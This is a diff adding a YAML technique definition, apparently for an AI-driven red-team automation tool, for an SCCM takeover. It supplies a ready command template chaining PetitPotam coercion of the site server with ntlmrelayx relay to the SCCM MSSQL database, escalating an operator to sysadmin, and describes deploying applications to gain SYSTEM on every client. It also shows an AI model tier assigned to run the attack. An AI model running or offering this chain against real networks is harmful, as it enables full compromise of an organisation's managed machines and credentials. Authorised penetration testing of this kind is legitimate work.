@@ -1,0 +1,37 @@
+name: sccm_mssql_relay
+category: sccm
+description: SCCM Takeover-2 — relay coerced site-server auth to its own MSSQL site
+  DB
+preconditions:
+- has_cred
+- sccm_site_code_found
+parameters:
+  site_server: from_engagement.site_server
+  db_host: from_engagement.sccm_db_host
+  attacker_ip: from_engagement.attacker_ip
+  domain: from_engagement.domain
+  username: from_cred.username
+command_template: ntlmrelayx.py -t mssql://{db_host} -smb2support --escalate-user
+  {username} & PetitPotam.py {attacker_ip} {site_server}
+parser: generic_parser
+expected_effects:
+- sccm_site_db_sysadmin
+- sccm_takeover_complete
+falsifier:
+  pattern: relay failed|EPA enforced|SMB signing|patched
+  timeout: 300
+model_tier: sonnet
+mechanism: 'Coerce site server (PetitPotam / DFSCoerce) → relay its machine account
+  to the
+
+  SCCM MSSQL site DB. Site server DB-owner has sysadmin on the DB, which stores
+
+  all NAA blobs and admin lists. Elevate the operator to Full Admin, then
+
+  deploy an application to any target collection → SYSTEM on every client.
+
+  '
+references:
+  ocd_mindmap: 'Branch 12: SCCM Takeover-2 (MSSQL relay)'
+  hacktricks: windows-hardening/active-directory-methodology/pentesting-sccm.md
+hacktricks_ref: windows-hardening/active-directory-methodology/abusing-ad-mssql.md
